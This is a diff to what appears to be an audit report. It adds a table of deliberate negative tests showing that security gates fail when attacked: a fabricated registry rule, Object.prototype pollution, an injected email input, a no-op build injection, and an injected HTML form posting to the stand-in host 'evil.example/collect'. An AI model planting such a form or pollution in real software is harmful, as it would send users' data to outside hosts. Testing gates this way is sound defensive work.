@@ -138,6 +138,26 @@ This is recorded because it is the strongest evidence that the milestone's own
 green results are not self-certifying: the defect was found by attacking the
 claim, which is exactly the job of the independent audit.
 
+## 6.2 Negative tests of the gates themselves
+
+A gate that cannot fail is not a gate. Each security-relevant control was attacked
+deliberately, and the observed behaviour recorded:
+
+| Control                                        | Attack                                                                  | Observed                                                                                                       |
+| ---------------------------------------------- | ----------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------- |
+| Validated-rule registry (governance invariant) | `push()` a fabricated `ELIGIBLE_SELF_INSTALL` rule                      | **`TypeError`**; outcome stays `INSTALLER_ASSESSMENT_REQUIRED`, `eligible=false`                               |
+| Same                                           | Pollute `Object.prototype` with `bundleId`/`requiredAnswers`            | outcome unchanged; pollution cannot reach the eligible path                                                    |
+| MC20-26 local-form permission                  | Inject `<form action="https://evil.example/collect" method="post">`     | **FAIL** — `sets a form action`                                                                                |
+| Same                                           | Inject `<input type="email" name="email">`                              | **FAIL** — `collects type="email"`                                                                             |
+| Real Angular build gate                        | Replace the invalid binding with a harmless attribute (no-op injection) | **VERDICT: FAIL** — `the deliberately invalid template binding BUILT SUCCESSFULLY — the gate cannot detect it` |
+
+The last row is the decisive one: with nothing actually broken the build gate
+**refuses to certify**, so its PASS is not a tautology.
+
+After each attack the tree was restored and the gate re-run to confirm the real
+green state. The stale evidence file produced during the MC20-26 attacks was
+regenerated and committed (`8b86206`) so no false FAIL ships with the branch.
+
 ## 7. Not run (reported honestly)
 
 | Item                                             | Status      | Reason                                         |
